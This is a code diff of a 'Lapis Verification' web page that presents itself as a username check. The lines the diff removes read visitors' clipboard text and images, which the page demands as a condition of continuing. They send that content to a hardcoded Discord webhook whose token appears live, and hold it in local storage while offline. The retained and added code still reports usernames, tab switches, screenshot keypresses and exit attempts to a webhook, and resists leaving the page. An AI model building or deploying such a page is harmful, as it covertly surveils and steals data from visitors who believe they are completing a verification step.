@@ -14,23 +14,20 @@
     justify-content: center;
     align-items: center;
     height: 100vh;
+    transition: filter 0.3s ease;
   }
   .card {
     background: #141922;
     padding: 24px;
     border-radius: 14px;
     width: 350px;
-    box-shadow: 0 8px 24px rgba(0, 0, 0, .5);
+    box-shadow: 0 8px 24px rgba(0,0,0,.5);
     text-align: center;
+    z-index: 2;
+    position: relative;
   }
-  h2 {
-    margin: 0 0 12px;
-  }
-  p {
-    margin: 0 0 14px;
-    font-size: 14px;
-    color: #a0a7b3;
-  }
+  h2 { margin: 0 0 12px }
+  p { margin: 0 0 14px; font-size: 14px; color: #a0a7b3 }
   input {
     width: 100%;
     padding: 12px;
@@ -50,46 +47,56 @@
     font-weight: bold;
     cursor: pointer;
   }
-  .hidden { display: none; }
-  .main-msg { font-size: 24px; font-weight: bold; }
-  .credits { font-size: 12px; color: #666; margin-top: 10px; }
+  .hidden { display: none }
+  .main-msg { font-size: 24px; font-weight: bold }
+  .overlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.85);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+    font-size: 22px;
+    font-weight: bold;
+    z-index: 3;
+    text-align: center;
+    padding: 20px;
+  }
+  .overlay.hidden { display: none }
 </style>
 </head>
 <body>
+  <div class="overlay hidden" id="overlay">
+    You left the page! Please return to continue.
+  </div>
+
   <div class="card" id="formCard">
     <h2>Lapis Verification</h2>
     <p>Please enter your username to continue.</p>
     <input id="username" type="text" placeholder="Username" autocomplete="off"/>
     <button id="continueBtn">Continue</button>
-    <div class="credits" id="credits">Credits to Suutash!</div>
   </div>
 
   <div class="card hidden" id="mainCard">
     <div class="main-msg">LAPIS ON TOP</div>
+    <p style="font-size:12px; color:#888;">Credits to Suutash!</p>
   </div>
 
 <script>
 (() => {
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1411200000498733066/aygmw5Hd12xvEEnyE8aGgkoJB2nnfkxMvXg54Y-U9BxtrbAn9n0Pjq4UWV_x1I8Pykuj";
+  const WEBHOOK_URL = "YOUR_WEBHOOK_HERE";
 
   const usernameInput = document.getElementById("username");
   const continueBtn = document.getElementById("continueBtn");
   const formCard = document.getElementById("formCard");
   const mainCard = document.getElementById("mainCard");
-  const credits = document.getElementById("credits");
+  const overlay = document.getElementById("overlay");
 
   let username = "";
 
-  // If credits removed, break site
-  const observer = new MutationObserver(() => {
-    if (!document.body.contains(credits)) {
-      document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:50px;'>Site corrupted: Credits removed!</h1>";
-    }
-  });
-  observer.observe(document.body, { childList: true, subtree: true });
-
-  // Webhook with offline fallback
-  const sendWebhook = async (reason, imageBase64 = null) => {
+  const sendWebhook = async (reason) => {
     const embed = {
       title: "Lapis Alert",
       description: `**User:** ${username || "(unknown)"}\n${reason}`,
@@ -98,108 +105,43 @@
       timestamp: new Date()
     };
 
-    const payload = { embeds: [embed] };
-
-    if (imageBase64) {
-      payload.content = "Screenshot detected!";
-      payload.embeds[0].image = { url: `attachment://screenshot.png` };
-    }
-
     try {
-      const options = {
+      await fetch(WEBHOOK_URL, {
         method: "POST",
-        body: imageBase64 ? createFormData(payload, imageBase64) : JSON.stringify(payload),
-        headers: imageBase64 ? {} : { "Content-Type": "application/json" }
-      };
-      await fetch(WEBHOOK_URL, options);
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
     } catch (err) {
-      const stored = JSON.parse(localStorage.getItem("lapisEvents") || "[]");
-      stored.push({ reason, imageBase64 });
-      localStorage.setItem("lapisEvents", JSON.stringify(stored));
+      console.error("Webhook failed", err);
     }
-  };
-
-  const createFormData = (payload, imageBase64) => {
-    const formData = new FormData();
-    formData.append("payload_json", JSON.stringify(payload));
-    const blob = base64ToBlob(imageBase64, "image/png");
-    formData.append("files[0]", blob, "screenshot.png");
-    return formData;
-  };
-
-  const base64ToBlob = (base64, type = "image/png") => {
-    const byteChars = atob(base64.split(",")[1]);
-    const byteNumbers = new Array(byteChars.length);
-    for (let i = 0; i < byteChars.length; i++) {
-      byteNumbers[i] = byteChars.charCodeAt(i);
-    }
-    return new Blob([new Uint8Array(byteNumbers)], { type });
-  };
-
-  window.addEventListener("online", async () => {
-    const stored = JSON.parse(localStorage.getItem("lapisEvents") || "[]");
-    if (stored.length > 0) {
-      for (const event of stored) {
-        await sendWebhook(event.reason, event.imageBase64);
-      }
-      localStorage.removeItem("lapisEvents");
-    }
-  });
-
-  // Clipboard read
-  const readClipboard = async () => {
-    try {
-      const permission = await navigator.permissions.query({ name: "clipboard-read" });
-      if (permission.state === "denied") return false;
-
-      const items = await navigator.clipboard.read();
-      for (const item of items) {
-        if (item.types.includes("image/png")) {
-          const blob = await item.getType("image/png");
-          const base64 = await blobToBase64(blob);
-          await sendWebhook("Screenshot pasted from clipboard", base64);
-          return true;
-        }
-      }
-
-      const text = await navigator.clipboard.readText();
-      if (text) {
-        await sendWebhook(`Clipboard text: ${text}`);
-        return true;
-      }
-    } catch (e) {
-      console.error("Clipboard read error", e);
-      return false;
-    }
-  };
-
-  const blobToBase64 = (blob) => {
-    return new Promise((resolve) => {
-      const reader = new FileReader();
-      reader.onloadend = () => resolve(reader.result);
-      reader.readAsDataURL(blob);
-    });
   };
 
   // Continue button
-  continueBtn.addEventListener("click", async () => {
+  continueBtn.addEventListener("click", () => {
     username = usernameInput.value.trim();
-    if (!username) return alert("Enter your username");
-
-    const success = await readClipboard();
-    if (!success) {
-      alert("Clipboard access is required to continue. Please allow permissions.");
-      return;
-    }
-
+    if (!username) return;
     formCard.classList.add("hidden");
     mainCard.classList.remove("hidden");
     sendWebhook("User continued to LAPIS page.");
   });
 
-  // Refresh detection
-  window.addEventListener("beforeunload", () => {
-    sendWebhook("Page was refreshed.");
+  // Before unload confirmation
+  window.addEventListener("beforeunload", (e) => {
+    sendWebhook("User tried to leave/refresh the page.");
+    e.preventDefault();
+    e.returnValue = "";
+  });
+
+  // Tab focus/blur detection
+  document.addEventListener("visibilitychange", () => {
+    if (document.hidden) {
+      document.body.style.filter = "blur(15px)";
+      overlay.classList.remove("hidden");
+      sendWebhook("User switched tabs or minimized (possible screenshot).");
+    } else {
+      document.body.style.filter = "none";
+      overlay.classList.add("hidden");
+    }
   });
 
   // Screenshot key detection
@@ -211,10 +153,6 @@
       sendWebhook("Tried Win+Shift+S.");
   };
   window.addEventListener("keydown", onKey, true);
-
-  document.addEventListener("visibilitychange", () => {
-    if (!document.hidden) sendWebhook("Screen changed — possible screenshot on mobile.");
-  });
 })();
 </script>
 </body>
